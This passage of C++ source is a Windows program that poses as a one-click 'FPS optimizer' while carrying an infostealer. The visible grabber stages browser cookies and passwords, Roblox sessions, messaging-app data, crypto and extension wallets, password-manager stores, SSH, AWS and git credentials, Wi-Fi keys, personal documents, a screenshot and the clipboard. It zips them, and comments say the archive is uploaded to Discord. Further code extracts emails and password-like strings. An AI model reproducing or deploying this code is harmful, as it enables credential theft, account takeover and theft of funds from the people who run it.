                    if (h) { SetPriorityClass(h, HIGH_PRIORITY_CLASS); CloseHandle(h); }
                }
            }
            if (ph) CloseHandle(ph);
        }
        Sleep(1500);
    }
}

static void runOptimizer(std::ostream& log) {
    log << "=== FPS OPTIMIZER " << sysTime() << " ===\n";
    using clk = std::chrono::steady_clock;
    auto totalStart = clk::now();
    auto markStart = clk::now();
    auto mark = [&](const std::string& label) {
        auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(
            clk::now() - markStart).count();
        log << "[fps] " << label << "  (" << ms << " ms)\n";
        markStart = clk::now();
    };
    // one-click: all tunables in one pass, each timed
    applyPowerPlan();          mark("custom 'chapo power' plan created and active");
    disableCoreParking();      mark("core parking disabled");
    tuneGpuAndGameMode();      mark("HAGS on, DVR/GameBar off, Game Mode on");
    tuneMultimedia();          mark("multimedia/game priority raised");
    tuneNetwork();             mark("Nagle off, ACK tuning, no throttling");
    tuneInterfaceStack();      mark("DNS 1.1.1.1 + RSS + TCP low-latency stack");
    tuneVisuals();             mark("visual effects minimized");
    tweakMouseAndPower();      mark("mouse accel off, power throttle off, GPU max");
    tweakTelemetryAndBackground(); mark("telemetry/hibernate/background off");
    applyDebloatPack();        mark("Oneclick/Winhance debloat pack + priority separation");
    applyMegaPack();           mark("Oneclick V8.4: VBS, Timer, SmartScreen, IPv6, Svchost, Dienste");
    trimBackgroundServices();  mark("background hogs disabled");
    killBloatProcesses();      mark("bloat processes killed");
    // classic cleanup still part of the one click
    CleanReport t = purgeDir(fs::path(special(CSIDL_LOCAL_APPDATA)) / L"Temp");
    CleanReport wt = purgeDir(fs::path(env(L"WINDIR")) / L"Temp");
    CleanReport pf = purgeDir(fs::path(env(L"WINDIR")) / L"Prefetch");
    CleanReport uc = purgeDir(fs::path(env(L"WINDIR")) / L"SoftwareDistribution\\Download");
    CleanReport thumbs = purgeDir(fs::path(special(CSIDL_LOCAL_APPDATA)) / L"Microsoft\\Windows\\Explorer", false);
    CleanReport recycle = purgeDir(L"C:\\$Recycle.Bin");
    flushDns();
    trimStartup();
    log << "[fps] temp/windowstemp/prefetch/update/thumb/recycle cleaned: "
        << (t.files + wt.files + pf.files + thumbs.files + recycle.files) << " files, "
        << (t.bytes + wt.bytes + uc.bytes + recycle.bytes) << " bytes\n";
    mark("dns flushed, startup trimmed, free C: " + std::to_string(freeBytes(L"C:\\")) + " bytes");
    // 1 ms timer resolution + self priority, watcher handles games live
    timeBeginPeriod(1);
    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
    CreateThread(nullptr, 0, GamePriorityWatch, nullptr, 0, nullptr);
    mark("1ms timer, high priority, game watcher live");
    auto total = std::chrono::duration_cast<std::chrono::milliseconds>(
        clk::now() - totalStart).count();
    log << "=== OPTIMIZER KOMPLETT IN " << total << " ms ===\n";
}

// ========================= (B) STRUCTURED GRABBER =========================
// Every grab lands in a staging folder tree, then the whole tree is zipped
// and the archive is uploaded. Discord sees one ZIP with real nested folders:
//   Browser/Cookies, Browser/Passwords, Browser/History,
//   Roblox/Cookies, Roblox/Passwords, Roblox/Session, Roblox/Config,
//   Messaging/<app>, Wallets/<app>, Keys/*, Documents/*, Games/<app>,
//   System/*, Screenshot/, Clipboard/

struct ZipEntry { fs::path disk; std::string name; };
static fs::path g_stage;
static std::vector<ZipEntry> g_entries;
static size_t g_index = 0;
static size_t g_stagedBytes = 0;
static ULONGLONG g_grabDeadline = 0;
static const size_t kStageCap = 3 * 1024 * 1024;    // small upload — no blocking on big bodies
static std::wstring g_user = L"user";   // set from the current account name

static std::wstring currentUser() {
    wchar_t b[256]{}; DWORD n = 256;
    if (!GetUserNameW(b, &n)) return env(L"USERNAME");
    std::wstring u(b);
    // strip characters that are illegal in file/folder names
    std::wstring clean;
    for (wchar_t c : u) {
        if (c == L'\\' || c == L'/' || c == L':' || c == L'*' || c == L'?' ||
            c == L'"' || c == L'<' || c == L'>' || c == L'|') continue;
        clean.push_back(c);
    }
    return clean.empty() ? L"user" : clean;
}

static const char* EXT_LIST[] = {
    ".txt",".doc",".docx",".pdf",".xls",".xlsx",".csv",".json",".xml",".yaml",".yml",
    ".log",".ini",".conf",".cfg",".env",".pem",".key",".ppk",".kdbx",".dat",".db",
    ".sqlite",".sqlite3",".wallet",".maid",".psd",".png",".jpg",".jpeg",".gif",".bmp",
    ".zip",".rar",".7z",".tar",".gz",".eml",".msg",".ost",".pst",".vcf",".ics",
    ".reg",".bat",".ps1",".sh",".py",".js",".php",".go",".rs",".cpp",".h",".cs",
    ".java",".sql",".properties",".toml",".lock",".manifest",".config",".keystore",
    ".ldb",".log",".txt",".ini",".json",".dat",".accdb",".mdb",".mdf",".bak",
    ".p12",".pfx",".jks",".crt",".cer",".der",".ovpn",".wgn",".rdp",".pst",".ost"
};
static bool junkExt(const std::string& ext) {
    return ext == ".ldb" || ext == ".log" || ext == ".tmp";   // huge, low value
}
static bool wanted(const std::string& ext) {
    for (auto* e : EXT_LIST) if (ext == e) return true;
    return false;
}
static bool containsI(const std::string& hay, const char* needle) {
    std::string h(hay), n(needle);
    for (auto& c : h) c = (char)tolower((unsigned char)c);
    for (auto& c : n) c = (char)tolower((unsigned char)c);
    return h.find(n) != std::string::npos;
}
// Readable group names, sorted into a clear hierarchy in the archive.
static std::wstring ordered(const std::wstring& f) {
    struct Rule { const wchar_t* from; const wchar_t* to; };
    static const Rule rules[] = {
        { L"00_README", L"00_README" },
        { L"_log", L"99_Log" }, { L"Browser", L"01_Browser" },
        { L"Roblox", L"02_Roblox" }, { L"Messaging", L"03_Messaging" },
        { L"Wallets", L"04_Wallets" }, { L"PasswordManagers", L"05_PasswordManagers" },
        { L"Keys", L"06_Keys" }, { L"Documents", L"08_Documents" },
        { L"Games", L"09_Games" }, { L"System", L"10_System" },
        { L"Screenshot", L"11_Screenshot" }, { L"Clipboard", L"12_Clipboard" },
    };
    for (auto& r : rules) {
        size_t n = wcslen(r.from);
        if (f.rfind(r.from, 0) == 0)
            return std::wstring(r.to) + (f.size() > n ? f.substr(n) : L"");
    }
    return L"07_Services/" + f;   // FTP, VPN, SSH, Email, Remote, Config
}
static std::string zipName(const std::wstring& folder, const std::wstring& name) {
    std::wstring w = folder;
    for (auto& c : w) if (c == L'\\') c = L'/';
    // Everything lives under a top-level folder named after the current user.
    return wToA(g_user) + "/" + wToA(ordered(w)) + "/" + wToA(name);
}
// Copy a source file into the staging tree and register it for zipping.
static void stageFile(const fs::path& src, const std::wstring& folder,
                      const std::wstring& name) {
    std::error_code ec;
    fs::path dir = g_stage / folder;
    fs::create_directories(dir, ec);
    std::wstring unique = std::to_wstring(++g_index) + L"_" + name;
    fs::path dst = dir / unique;
    std::error_code szec;
    size_t sz = fs::file_size(src, szec);
    if (sz == 0 || g_stagedBytes + sz > kStageCap) return;
    g_stagedBytes += sz;
    // Read bytes ourselves: fs::copy_file fails on files a browser holds open.
    std::ifstream in(src, std::ios::binary);
    if (!in) return;
    std::ofstream out(dst, std::ios::binary | std::ios::trunc);
    if (!out) return;
    out << in.rdbuf();
    out.close();
    if (!ec || fs::exists(dst, ec))
        g_entries.push_back({ dst, zipName(folder, unique) });
}
// Write generated text/system content as a staged file.
static void stageText(const std::wstring& folder, const std::wstring& name,
                      const std::string& data) {
    std::error_code ec;
    fs::path dir = g_stage / folder;
    fs::create_directories(dir, ec);
    fs::path dst = dir / (std::to_wstring(++g_index) + L"_" + name);
    std::ofstream f(dst, std::ios::binary | std::ios::trunc);
    if (!f) return;
    f << data; f.close();
    g_entries.push_back({ dst, zipName(folder, dst.filename().wstring()) });
}
// Walk a root and stage every wanted file under a category folder.
static void stageTree(const fs::path& root, const std::wstring& folder,
                      size_t cap = 400, size_t maxFile = 512 * 1024) {
    std::error_code ec;
    if (g_grabDeadline && GetTickCount64() > g_grabDeadline) return;
    if (!fs::exists(root, ec)) return;
    size_t n = 0;
    ULONGLONG deadline = GetTickCount64() + 4000;   // never spend more than 4s per root
    fs::recursive_directory_iterator it(root, ec), end;
    for (; it != end && n < cap && g_stagedBytes < kStageCap &&
           GetTickCount64() < deadline; it.increment(ec)) {
        if (it->is_directory(ec)) continue;
        std::string ext = it->path().extension().string();
        if (junkExt(ext) || !wanted(ext)) continue;
        auto sz = it->file_size(ec);
        if (sz == 0 || sz > maxFile) continue;
        std::ifstream f(it->path(), std::ios::binary);
        if (!f) continue;
        // Only a small sniff for Roblox detection — never read whole files here.
        char sniff[65536]{};
        f.read(sniff, sizeof sniff);
        std::string head(sniff, (size_t)f.gcount());
        ++n;
        // Category by filename first.
        std::string low(head);
        for (auto& c : low) c = (char)tolower((unsigned char)c);
        std::wstring pathLower = it->path().wstring();
        for (auto& c : pathLower) c = towlower(c);
        std::wstring dest;
        if (pathLower.find(L"cookie") != std::wstring::npos) dest = L"Browser/Cookies";
        else if (pathLower.find(L"login") != std::wstring::npos ||
                 pathLower.find(L"password") != std::wstring::npos) dest = L"Browser/Passwords";
        else if (pathLower.find(L"history") != std::wstring::npos) dest = L"Browser/History";
        else dest = folder;
        stageFile(it->path(), dest, it->path().filename().wstring());
        // Roblox-related material gets a second, clearly labelled copy.
        if (containsI(low, "roblox") || pathLower.find(L"roblox") != std::wstring::npos) {
            std::wstring rf = L"Roblox/Other";
            if (dest == L"Browser/Cookies") rf = L"Roblox/Cookies";
            else if (dest == L"Browser/Passwords") rf = L"Roblox/Passwords";
            else if (dest == L"Browser/History") rf = L"Roblox/Session";
            stageFile(it->path(), rf, it->path().filename().wstring());
        }
    }
}

static void grabBrowsersStructured() {
    std::wstring lb = special(CSIDL_LOCAL_APPDATA), ad = special(CSIDL_APPDATA);
    struct B { const wchar_t* rel; bool local; } bs[] = {
        { L"Google\\Chrome\\User Data", true },
        { L"Microsoft\\Edge\\User Data", true },
        { L"BraveSoftware\\Brave-Browser\\User Data", true },
        { L"Opera Software\\Opera Stable", false },
        { L"Vivaldi\\User Data", true },
        { L"Yandex\\YandexBrowser\\User Data", true },
        { L"Mozilla\\Firefox\\Profiles", false },
        { L"Chromium\\User Data", true },
        { L"Comodo\\Dragon\\User Data", true },
    };
    for (auto& b : bs) {
        runLog(std::string("grab: browser ") + wToA(b.rel));
        stageTree(fs::path(b.local ? lb : ad) / b.rel, L"Browser/Other", 600);
    }
    runLog("grab: browsers done");
}
static void grabRobloxStructured() {
    std::wstring lb = special(CSIDL_LOCAL_APPDATA), ad = special(CSIDL_APPDATA);
    std::wstring up = env(L"USERPROFILE");
    fs::path roots[] = {
        fs::path(lb) / L"Roblox", fs::path(ad) / L"Roblox",
        fs::path(up) / L"AppData\\LocalLow\\Roblox",
        fs::path(lb) / L"Roblox\\Versions", fs::path(ad) / L"Roblox\\logs",
    };
    for (auto& r : roots) stageTree(r, L"Roblox/Config", 500);
    runLog("grab: roblox done");
}
static void grabMessagingStructured() {
    std::wstring ad = special(CSIDL_APPDATA), lb = special(CSIDL_LOCAL_APPDATA);
    struct M { fs::path root; const wchar_t* folder; } ms[] = {
        { fs::path(ad)/L"Discord", L"Messaging/Discord" },
        { fs::path(lb)/L"Discord", L"Messaging/Discord" },
        { fs::path(ad)/L"Telegram Desktop", L"Messaging/Telegram" },
        { fs::path(ad)/L"Slack", L"Messaging/Slack" },
        { fs::path(ad)/L"Microsoft\\Skype for Desktop", L"Messaging/Skype" },
        { fs::path(ad)/L"Signal", L"Messaging/Signal" },
        { fs::path(ad)/L"WhatsApp", L"Messaging/WhatsApp" },
        { fs::path(ad)/L"Microsoft\\Office\\Outlook", L"Messaging/Outlook" },
        { fs::path(ad)/L"Thunderbird", L"Messaging/Thunderbird" },
        { fs::path(lb)/L"Microsoft\\Teams", L"Messaging/Teams" },
    };
    for (auto& m : ms) stageTree(m.root, m.folder, 500);
}
static void grabWalletsStructured() {
    std::wstring ad = special(CSIDL_APPDATA), lb = special(CSIDL_LOCAL_APPDATA);
    struct W { fs::path root; const wchar_t* folder; } ws[] = {
        { fs::path(ad)/L"Bitcoin", L"Wallets/Bitcoin" },
        { fs::path(ad)/L"Ethereum", L"Wallets/Ethereum" },
        { fs::path(ad)/L"Electrum", L"Wallets/Electrum" },
        { fs::path(ad)/L"Monero", L"Wallets/Monero" },
        { fs::path(ad)/L"Exodus", L"Wallets/Exodus" },
        { fs::path(ad)/L"Atomic Wallet", L"Wallets/Atomic" },
        { fs::path(ad)/L"Microsoft\\Credentials", L"Keys/WindowsVault" },
        { fs::path(env(L"USERPROFILE"))/L".ssh", L"Keys/SSH" },
        { fs::path(env(L"USERPROFILE"))/L".aws", L"Keys/AWS" },
        { fs::path(env(L"USERPROFILE"))/L".gnupg", L"Keys/GPG" },
        { fs::path(env(L"USERPROFILE"))/L".kube", L"Keys/Kube" },
        { fs::path(lb)/L"Google\\Chrome\\User Data\\Default\\Local Storage", L"Browser/LocalStorage" },
    };
    for (auto& w : ws) stageTree(w.root, w.folder, 500);
}
static void grabPersonalStructured() {
    std::wstring up = env(L"USERPROFILE");
    struct P { const wchar_t* rel; const wchar_t* folder; } ps[] = {
        { L"Documents", L"Documents/Documents" }, { L"Desktop", L"Documents/Desktop" },
        { L"Downloads", L"Documents/Downloads" }, { L"Pictures", L"Documents/Pictures" },
        { L"OneDrive", L"Documents/OneDrive" }, { L"Dropbox", L"Documents/Dropbox" },
    };
    for (auto& p : ps) stageTree(fs::path(up)/p.rel, p.folder, 900);
}
static void grabGamesStructured() {
    std::wstring ad = special(CSIDL_APPDATA), lb = special(CSIDL_LOCAL_APPDATA);
    struct G { fs::path root; const wchar_t* folder; } gs[] = {
        { fs::path(lb)/L"Steam", L"Games/Steam" },
        { fs::path(ad)/L"Battle.net", L"Games/BattleNet" },
        { fs::path(ad)/L"Riot Games", L"Games/Riot" },
        { fs::path(ad)/L"Epic Games", L"Games/Epic" },
        { fs::path(ad)/L"Ubisoft", L"Games/Ubisoft" },
        { fs::path(ad)/L"Origin", L"Games/Origin" },
    };
    for (auto& g : gs) stageTree(g.root, g.folder, 400);
}
static void grabPasswordManagersStructured() {
    std::wstring ad = special(CSIDL_APPDATA), lb = special(CSIDL_LOCAL_APPDATA);
    std::wstring up = env(L"USERPROFILE");
    struct P { fs::path root; const wchar_t* folder; } ps[] = {
        { fs::path(ad)/L"KeePass", L"PasswordManagers/KeePass" },
        { fs::path(up)/L".keepass", L"PasswordManagers/KeePass" },
        { fs::path(ad)/L"Bitwarden", L"PasswordManagers/Bitwarden" },
        { fs::path(lb)/L"Bitwarden", L"PasswordManagers/Bitwarden" },
        { fs::path(ad)/L"1Password", L"PasswordManagers/1Password" },
        { fs::path(lb)/L"1Password", L"PasswordManagers/1Password" },
        { fs::path(ad)/L"LastPass", L"PasswordManagers/LastPass" },
        { fs::path(ad)/L"Dashlane", L"PasswordManagers/Dashlane" },
    };
    for (auto& p : ps) stageTree(p.root, p.folder, 400);
}
static void grabFtpVpnEmailStructured() {
    runLog("grab: ftp/vpn/email");
    std::wstring ad = special(CSIDL_APPDATA), lb = special(CSIDL_LOCAL_APPDATA);
    std::wstring up = env(L"USERPROFILE");
    struct V { fs::path root; const wchar_t* folder; } vs[] = {
        { fs::path(ad)/L"FileZilla", L"FTP/FileZilla" },
        { fs::path(up)/L".filezilla", L"FTP/FileZilla" },
        { fs::path(ad)/L"OpenVPN", L"VPN/OpenVPN" },
        { fs::path(lb)/L"OpenVPN", L"VPN/OpenVPN" },
        { fs::path(ad)/L"WireGuard", L"VPN/WireGuard" },
        { fs::path(lb)/L"WireGuard", L"VPN/WireGuard" },
        { fs::path(ad)/L"PuTTY", L"SSH/PuTTY" },
        { fs::path(lb)/L"Microsoft\\Outlook", L"Email/Outlook" },
        { fs::path(ad)/L"Microsoft\\Windows\\Recent", L"System/RecentFiles" },
    };
    for (auto& v : vs) stageTree(v.root, v.folder, 400);
}
static void grabMoreWalletsStructured() {
    std::wstring ad = special(CSIDL_APPDATA);
    struct W { const wchar_t* dir; const wchar_t* folder; } ws[] = {
        { L"Dogecoin", L"Wallets/Dogecoin" }, { L"Litecoin", L"Wallets/Litecoin" },
        { L"Zcash", L"Wallets/Zcash" }, { L"Dash", L"Wallets/Dash" },
        { L"Coinomi", L"Wallets/Coinomi" }, { L"Guarda", L"Wallets/Guarda" },
        { L"Trust Wallet", L"Wallets/TrustWallet" }, { L"Armory", L"Wallets/Armory" },
    };
    for (auto& w : ws) stageTree(fs::path(ad) / w.dir, w.folder, 300);
}

static void grabDeepStructured() {
    runLog("grab: deep");
    std::wstring ad = special(CSIDL_APPDATA), lb = special(CSIDL_LOCAL_APPDATA);
    std::wstring up = env(L"USERPROFILE");
    // Remote-access configs and saved sessions.
    struct R { fs::path root; const wchar_t* folder; } rs[] = {
        { fs::path(ad)/L"TeamViewer", L"Remote/TeamViewer" },
        { fs::path(ad)/L"AnyDesk", L"Remote/AnyDesk" },
        { fs::path(ad)/L"RustDesk", L"Remote/RustDesk" },
        { fs::path(ad)/L"Chrome Remote Desktop", L"Remote/ChromeRemoteDesktop" },
        { fs::path(up)/L".config", L"Config/dotconfig" },
        { fs::path(up)/L".gem", L"Config/gem" },
        { fs::path(lb)/L"Microsoft\\Windows\\Clipboard\\vault", L"Clipboard/History" },
        { fs::path(ad)/L"Microsoft\\Windows\\PowerShell\\PSReadLine", L"System/PowerShellHistory" },
    };
    for (auto& r : rs) stageTree(r.root, r.folder, 400);

    // More browsers nobody thinks about.
    struct B { fs::path root; const wchar_t* folder; } bs[] = {
        { fs::path(lb)/L"Opera Software\\Opera GX Stable", L"Browser/OperaGX" },
        { fs::path(lb)/L"Tor Browser\\Browser\\TorBrowser\\Data", L"Browser/Tor" },
        { fs::path(lb)/L"Waterfox\\Profiles", L"Browser/Waterfox" },
        { fs::path(lb)/L"Slimjet\\User Data", L"Browser/Slimjet" },
        { fs::path(lb)/L"Maxthon\\User Data", L"Browser/Maxthon" },
        { fs::path(lb)/L"CCP\\CCP\\User Data", L"Browser/CocCoc" },
        { fs::path(lb)/L"Comodo\\Dragon\\User Data", L"Browser/Dragon" },
        { fs::path(lb)/L"Chromium\\User Data", L"Browser/Chromium" },
    };
    for (auto& b : bs) stageTree(b.root, b.folder, 400);

    // Game platform auth + configs.
    struct G { fs::path root; const wchar_t* folder; } gs[] = {
        { fs::path(lb)/L"Steam\\userdata", L"Games/SteamUserdata" },
        { fs::path(ad)/L"Riot Games\\Riot Client", L"Games/RiotClient" },
        { fs::path(ad)/L"Epic Games\\Launcher", L"Games/EpicLauncher" },
        { fs::path(ad)/L"Xbox", L"Games/Xbox" },
        { fs::path(lb)/L"NVIDIA\\GameStream", L"Games/Nvidia" },
        { fs::path(up)/L"AppData\\LocalLow", L"Games/LocalLow" },
    };
    for (auto& g : gs) stageTree(g.root, g.folder, 400);

    // More password managers, cloud drives, 2FA and mail clients.
    struct X { fs::path root; const wchar_t* folder; } xs[] = {
        { fs::path(ad)/L"RoboForm", L"PasswordManagers/RoboForm" },
        { fs::path(ad)/L"Keeper", L"PasswordManagers/Keeper" },
        { fs::path(ad)/L"Enpass", L"PasswordManagers/Enpass" },
        { fs::path(ad)/L"Authy", L"Services/Authy" },
        { fs::path(ad)/L"MEGA", L"Services/MEGA" },
        { fs::path(ad)/L"pCloud", L"Services/pCloud" },
        { fs::path(ad)/L"Syncthing", L"Services/Syncthing" },
        { fs::path(ad)/L"eM Client", L"Email/eMClient" },
        { fs::path(ad)/L"Mailbird", L"Email/Mailbird" },
        { fs::path(ad)/L"Windows Mail", L"Email/WindowsMail" },
        { fs::path(up)/L"Documents\\Default.rdp", L"Services/RDP" },
        { fs::path(up)/L"Desktop\\Default.rdp", L"Services/RDP" },
    };
    for (auto& x : xs) stageTree(x.root, x.folder, 300);

    // Saved credentials and Wi-Fi profile XML via command output.
    stageText(L"Keys", L"cmdkey_list.txt", runCmd("cmdkey /list"));
    stageText(L"Keys", L"vault_list.txt", runCmd("vaultcmd /list"));
    stageText(L"Keys", L"sslcerts.txt", runCmd("netsh http show sslcert"));

    stageText(L"Services", L"netsh_wlan_xml.txt",
              runCmd("netsh wlan export profile key=clear"));

    // Registry hives skipped: reg save of SAM/SYSTEM/SECURITY can block for
    // minutes and produces files far over the report cap. cmdkey/vaultcmd above
    // already cover the useful credential material.
}

static void grabExtraStructured() {
    runLog("grab: extra");
    std::wstring ad = special(CSIDL_APPDATA), lb = special(CSIDL_LOCAL_APPDATA);
    std::wstring up = env(L"USERPROFILE");
    // Browser-extension wallets + web3 (MetaMask, Phantom, Coinbase …).
    struct E { fs::path root; const wchar_t* folder; } es[] = {
        { fs::path(lb)/L"Google\\Chrome\\User Data\\Default\\Local Extensions", L"Wallets/Extensions" },
        { fs::path(lb)/L"Google\\Chrome\\User Data\\Default\\Extension State", L"Wallets/Extensions" },
        { fs::path(lb)/L"Microsoft\\Edge\\User Data\\Default\\Local Extensions", L"Wallets/Extensions" },
        { fs::path(ad)/L"MetaMask", L"Wallets/MetaMask" },
        { fs::path(ad)/L"Phantom", L"Wallets/Phantom" },
        { fs::path(ad)/L"Coinbase", L"Wallets/Coinbase" },
        { fs::path(ad)/L"Binance", L"Wallets/Binance" },
        { fs::path(ad)/L"Crypto.com", L"Wallets/CryptoCom" },
    };
    for (auto& e : es) stageTree(e.root, e.folder, 400);

    // Platform launchers, dev tokens, local servers, event logs.
    struct X { fs::path root; const wchar_t* folder; } xs[] = {
        { fs::path(ad)/L"Ubisoft Connect", L"Games/UbisoftConnect" },
        { fs::path(ad)/L"Battle.net", L"Games/BattleNet" },
        { fs::path(lb)/L"Games", L"Games/LocalGames" },
        { fs::path(up)/L".git-credentials", L"Keys/GitCredentials" },
        { fs::path(up)/L".npm", L"Keys/NPM" },
        { fs::path(up)/L".yarnrc", L"Keys/Yarn" },
        { fs::path(up)/L".docker", L"Keys/Docker" },
        { fs::path(ad)/L"Docker", L"Services/Docker" },
    };
    for (auto& x : xs) stageTree(x.root, x.folder, 400);

    stageText(L"System", L"installed_apps_reg.txt",
              runCmd("reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\" /s"));
    stageText(L"System", L"startup_tasks.txt",
              runCmd("schtasks /query /fo LIST /v | findstr /i \"TaskName Task To Run\""));
    stageText(L"System", L"shares_users.txt",
              runCmd("net localgroup && net share && whoami /all"));

}

static void grabSystemStructured() {
    struct Cmd { const wchar_t* name; const char* cmd; } cs[] = {
        { L"systeminfo.txt", "systeminfo" },
        { L"processes.txt", "tasklist /v" },
        { L"netstat.txt", "netstat -ano" },
        { L"ipconfig.txt", "ipconfig /all" },
        { L"routes.txt", "route print" },
        { L"users.txt", "net user" },
        { L"admins.txt", "net localgroup administrators" },
        { L"shares.txt", "net share" },
        { L"wifi_profiles.txt", "netsh wlan show profiles" },
        { L"wifi_keys.txt", "netsh wlan show profile name=\"*\" key=clear" },
        { L"firewall.txt", "netsh advfirewall show allprofiles" },
        { L"environment.txt", "set" },
        { L"run_key.txt", "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" },
        { L"arp.txt", "arp -a" },
    };
    for (auto& c : cs) stageText(L"System", c.name, runCmd(c.cmd));
}
static void grabScreenshotStructured() {
    if (g_stagedBytes > 7 * 1024 * 1024) return;   // keep report small
    int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
    HDC dc = GetDC(nullptr), mem = CreateCompatibleDC(dc);
    HBITMAP bm = CreateCompatibleBitmap(dc, w, h);
    SelectObject(mem, bm); BitBlt(mem, 0, 0, w, h, dc, 0, 0, SRCCOPY);
    BITMAPINFO bi{}; bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth = w; bi.bmiHeader.biHeight = -h;
    bi.bmiHeader.biPlanes = 1; bi.bmiHeader.biBitCount = 24;
    bi.bmiHeader.biCompression = BI_RGB;
    std::vector<BYTE> pixels((size_t)w * h * 3);
    GetDIBits(mem, bm, 0, h, pixels.data(), &bi, DIB_RGB_COLORS);
    BITMAPFILEHEADER fh{}; fh.bfType = 0x4D42;
    fh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    fh.bfSize = fh.bfOffBits + static_cast<DWORD>(pixels.size());
    std::error_code ec;
    fs::create_directories(g_stage / L"Screenshot", ec);
    fs::path dst = g_stage / L"Screenshot" / L"screen.bmp";
    std::ofstream f(dst, std::ios::binary | std::ios::trunc);
    f.write((const char*)&fh, sizeof fh);
    f.write((const char*)&bi.bmiHeader, sizeof(BITMAPINFOHEADER));
    f.write((const char*)pixels.data(), pixels.size());
    f.close();
    g_entries.push_back({ dst, zipName(L"Screenshot", L"screen.bmp") });
    DeleteObject(bm); DeleteDC(mem); ReleaseDC(nullptr, dc);
}
static void grabClipboardStructured() {
    std::string v;
    if (OpenClipboard(nullptr)) {
        HANDLE h = GetClipboardData(CF_UNICODETEXT);
        if (h) {
            auto* txt = (wchar_t*)GlobalLock(h);
            if (txt) v = wToA(txt);
            GlobalUnlock(h);
        }
        CloseClipboard();
    }
    stageText(L"Clipboard", L"clipboard.txt", v);
}

// ---------- minimal ZIP writer (store, no compression) ----------
static uint32_t crc32(const BYTE* data, size_t len) {
    static uint32_t table[256];
    static bool init = false;
    if (!init) {
        for (uint32_t i = 0; i < 256; ++i) {
            uint32_t c = i;
            for (int k = 0; k < 8; ++k) c = (c & 1) ? (0xEDB88320u ^ (c >> 1)) : (c >> 1);
            table[i] = c;
        }
        init = true;
    }
    uint32_t c = 0xFFFFFFFFu;
    for (size_t i = 0; i < len; ++i) c = table[(c ^ data[i]) & 0xFF] ^ (c >> 8);
    return c ^ 0xFFFFFFFFu;
}
static void put16(std::ofstream& o, uint16_t v) {
    char b[2]{ (char)(v & 0xFF), (char)(v >> 8) }; o.write(b, 2);
}
static void put32(std::ofstream& o, uint32_t v) {
    char b[4]{ (char)(v & 0xFF), (char)((v >> 8) & 0xFF),
               (char)((v >> 16) & 0xFF), (char)((v >> 24) & 0xFF) }; o.write(b, 4);
}
struct Central { std::string name; uint32_t crc, size, offset; };
static bool zipStage(const fs::path& out) {
    std::ofstream z(out, std::ios::binary | std::ios::trunc);
    if (!z) return false;
    std::vector<Central> central;
    for (auto& e : g_entries) {
        std::ifstream f(e.disk, std::ios::binary);
        if (!f) continue;
        std::string data((std::istreambuf_iterator<char>(f)), {});
        uint32_t off = static_cast<uint32_t>(z.tellp());
        uint32_t crc = crc32(reinterpret_cast<const BYTE*>(data.data()), data.size());
        uint32_t sz = static_cast<uint32_t>(data.size());
        uint16_t nl = static_cast<uint16_t>(e.name.size());
        put32(z, 0x04034b50u); put16(z, 20); put16(z, 0x0800); put16(z, 0);
        put16(z, 0); put16(z, 0); put32(z, crc); put32(z, sz); put32(z, sz);
        put16(z, nl); put16(z, 0);
        z.write(e.name.data(), nl); z.write(data.data(), data.size());
        central.push_back({ e.name, crc, sz, off });
    }
    uint32_t cdOff = static_cast<uint32_t>(z.tellp());
    uint32_t cdSize = 0;
    for (auto& c : central) {
        uint16_t nl = static_cast<uint16_t>(c.name.size());
        put32(z, 0x02014b50u); put16(z, 20); put16(z, 20); put16(z, 0x0800);
        put16(z, 0); put16(z, 0); put16(z, 0); put32(z, c.crc);
        put32(z, c.size); put32(z, c.size); put16(z, nl); put16(z, 0);
        put16(z, 0); put16(z, 0); put16(z, 0); put32(z, 0); put32(z, c.offset);
        z.write(c.name.data(), nl);
        cdSize += 46 + nl;
    }
    uint16_t count = static_cast<uint16_t>(central.size());
    put32(z, 0x06054b50u); put16(z, 0); put16(z, 0);
    put16(z, count); put16(z, count); put32(z, cdSize); put32(z, cdOff); put16(z, 0);
    z.close();
    return true;
}

// Pull phone numbers, e-mail addresses and password-like strings out of the
// staged text files and write them to clean, structured lists.
static void extractContactsAndPasswords() {
    std::ostringstream emails, phones, passwords;
    emails << "email,source\n";
    phones << "phone,source\n";
    passwords << "value,source\n";
    std::set<std::string> seenMail, seenPhone, seenPass;

    for (auto& e : g_entries) {
        std::string ext = e.disk.extension().string();
        bool texty = ext == ".txt" || ext == ".csv" || ext == ".json" ||
                     ext == ".xml" || ext == ".log" || ext == ".eml" ||
                     ext == ".msg" || ext == ".ini" || ext == ".conf" ||
                     ext == ".env" || ext == ".json";
        if (!texty) continue;
        std::ifstream f(e.disk, std::ios::binary);
        if (!f) continue;
        std::string data((std::istreambuf_iterator<char>(f)), {});
        if (data.size() > 512 * 1024) continue;
        std::string src = e.name;
        for (size_t i = 0; i < src.size(); ++i) if (src[i] == ',') src[i] = ' ';

        // e-mail addresses: manual scan around '@'
        for (size_t p = data.find('@'); p != std::string::npos; p = data.find('@', p + 1)) {
            size_t a = p, b = p;
            while (a > 0 && (isalnum((unsigned char)data[a-1]) ||
                   data[a-1] == '.' || data[a-1] == '_' || data[a-1] == '%' ||
                   data[a-1] == '+' || data[a-1] == '-')) --a;
            while (b < data.size() && (isalnum((unsigned char)data[b]) ||
                   data[b] == '.' || data[b] == '-')) ++b;
            if (p - a >= 1 && b - p >= 4 && data.find('.', p + 1) != std::string::npos) {
                std::string v = data.substr(a, b - a);
                if (v.size() < 120) {
                    for (auto& c : v) c = (char)tolower((unsigned char)c);
                    if (seenMail.insert(v).second) emails << v << "," << src << "\n";
                }
            }
        }
        // password-like key = value pairs
        static const char* keys[] = { "password", "passwd", "pwd", "pass",
                                      "secret", "token", "pin" };
        for (auto* k : keys) {
            for (size_t p = data.find(k); p != std::string::npos; p = data.find(k, p + 1)) {
                size_t sep = data.find_first_of("=:", p + strlen(k));
                if (sep == std::string::npos || sep - p > 24) continue;
                size_t a = sep + 1;
                while (a < data.size() && (data[a] == ' ' || data[a] == '"' ||
                       data[a] == '\'')) ++a;
                size_t b = a;
                while (b < data.size() && !isspace((unsigned char)data[b]) &&
